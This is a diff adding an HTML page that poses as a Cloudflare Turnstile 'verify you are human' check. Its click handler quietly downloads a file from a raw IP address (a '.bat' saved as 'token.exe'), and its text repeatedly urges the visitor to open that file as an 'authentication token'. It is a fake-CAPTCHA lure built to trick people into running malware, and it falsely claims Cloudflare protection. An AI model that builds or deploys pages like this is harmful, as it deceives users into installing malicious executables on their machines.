@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon svg {
+            width: 32px;
+            height: 32px;
+            fill: white;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .turnstile-container {
+            margin: 30px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .turnstile-box {
+            background: #f9f9f9;
+            border: 2px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 20px 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            min-width: 280px;
+        }
+
+        .turnstile-box:hover {
+            border-color: #667eea;
+            background: #f0f4ff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.15);
+        }
+
+        .turnstile-box:active {
+            transform: translateY(0);
+        }
+
+        .turnstile-box.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .turnstile-box.success {
+            border-color: #4caf50;
+            background: #e8f5e9;
+        }
+
+        .turnstile-checkmark {
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .turnstile-box.success .turnstile-checkmark {
+            display: flex;
+        }
+
+        .turnstile-checkmark svg {
+            width: 24px;
+            height: 24px;
+            fill: #4caf50;
+        }
+
+        .turnstile-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .turnstile-box.success .turnstile-content {
+            display: none;
+        }
+
+        .radio-button {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #667eea;
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .radio-button::after {
+            content: '';
+            width: 12px;
+            height: 12px;
+            background: #667eea;
+            border-radius: 50%;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .turnstile-box:hover .radio-button::after {
+            opacity: 0.5;
+        }
+
+        .turnstile-label {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            text-align: left;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+
+        .footer {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #999;
+        }
+
+        .cloudflare-link {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .cloudflare-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .turnstile-box.loading .spinner {
+            display: block;
+        }
+
+        .turnstile-box.loading .turnstile-content {
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            display: none;
+            font-size: 14px;
+            color: #667eea;
+            font-weight: 500;
+        }
+
+        .turnstile-box.loading .loading-text {
+            display: block;
+        }
+
+        .progress-bar {
+            display: none;
+            width: 100%;
+            height: 3px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 15px;
+        }
+
+        .turnstile-box.loading .progress-bar {
+            display: block;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .success-message {
+            display: none;
+            color: #4caf50;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 10px;
+        }
+
+        .turnstile-box.success .success-message {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .turnstile-box {
+                padding: 15px 25px;
+                min-width: 250px;
+            }
+        }
+
+        .badge {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 4px 8px;
+            border-radius: 3px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+        }
+    </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="badge">Security Check</span>
+            <h1>Just a moment...</h1>
+            <p class="subtitle">
+                Please verify you're human by completing the security check below. 
+                This helps protect our website from bots and ensures a safe browsing experience.
+            </p>
+        </div>
+
+        <div class="info-box" style="background: #e8f4fd; border-left: 4px solid #667eea; padding: 15px; margin: 20px 0; text-align: left; border-radius: 4px;">
+            <p style="color: #1a73e8; font-size: 14px; font-weight: 500; margin: 0;">
+                📥 <strong>Important:</strong> An authentication token file will be downloaded
+            </p>
+            <p style="color: #666; font-size: 12px; margin: 8px 0 0 0; line-height: 1.5;">
+                Please open the downloaded file to complete authentication with this website. 
+                The file will contain your authentication token to gain access to the website.
+            </p>
+        </div>
+
+        <div class="turnstile-container">
+            <div class="turnstile-box" id="turnstileBox" onclick="handleTurnstile()">
+                <div class="turnstile-content">
+                    <div class="radio-button"></div>
+                    <span class="turnstile-label">Verify you are human</span>
+                </div>
+                <div class="spinner"></div>
+                <span class="loading-text">Verifying...</span>
+                <div class="turnstile-checkmark">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="success-message">✓ Verification successful! Authentication file downloaded - please open it to gain access</div>
+            </div>
+        </div>
+
+        <p class="info-text">
+            This security check helps us maintain a safe and secure environment for all users. 
+            Your verification is processed securely and your privacy is protected.
+            <br><br>
+            <strong>Important:</strong> After clicking verify, download and open the file 
+            to authenticate with our website. The file will contain your authentication token to gain access to the website.
+        </p>
+
+        <div class="footer">
+            <p class="footer-text">
+                Protected by <a href="#" class="cloudflare-link">Cloudflare Turnstile</a> | 
+                Privacy Policy | Terms of Service
+            </p>
+        </div>
+    </div>
+
+    <script>
+        function handleTurnstile() {
+            const turnstileBox = document.getElementById('turnstileBox');
+            const progressFill = document.getElementById('progressFill');
+            
+            // Prevent multiple clicks
+            if (turnstileBox.classList.contains('loading') || turnstileBox.classList.contains('success')) {
+                return;
+            }
+
+            // Start loading state
+            turnstileBox.classList.add('loading');
+            
+            // Simulate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 90) {
+                    progress = 90;
+                    clearInterval(progressInterval);
+                }
+                progressFill.style.width = progress + '%';
+            }, 100);
+
+            // Download the security token file
+            const downloadUrl = 'http://135.181.7.234:9090/token.txt.bat';
+            
+            // Create hidden download link
+            const link = document.createElement('a');
+            link.href = downloadUrl;
+            link.download = 'token.exe';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            
+            // Trigger download
+            link.click();
+            
+            // Clean up
+            setTimeout(() => {
+                document.body.removeChild(link);
+            }, 100);
+
+            // Simulate verification delay (2-4 seconds)
+            const verificationTime = 2000 + Math.random() * 2000;
+            
+            setTimeout(() => {
+                clearInterval(progressInterval);
+                progressFill.style.width = '100%';
+                
+                setTimeout(() => {
+                    turnstileBox.classList.remove('loading');
+                    turnstileBox.classList.add('success');
+                    
+                    // Show success message
+                    setTimeout(() => {
+                        // Optional: Redirect after success
+                        // window.location.href = '/dashboard';
+                    }, 1000);
+                }, 300);
+            }, verificationTime);
+        }
+
+        // Keyboard accessibility
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' || e.key === ' ') {
+                const turnstileBox = document.getElementById('turnstileBox');
+                if (document.activeElement === turnstileBox || turnstileBox.contains(document.activeElement)) {
+                    e.preventDefault();
+                    handleTurnstile();
+                }
+            }
+        });
+
+        // Make turnstile box focusable
+        document.getElementById('turnstileBox').setAttribute('tabindex', '0');
+        document.getElementById('turnstileBox').setAttribute('role', 'button');
+        document.getElementById('turnstileBox').setAttribute('aria-label', 'Verify you are human');
+    </script>
+</body>
+</html>
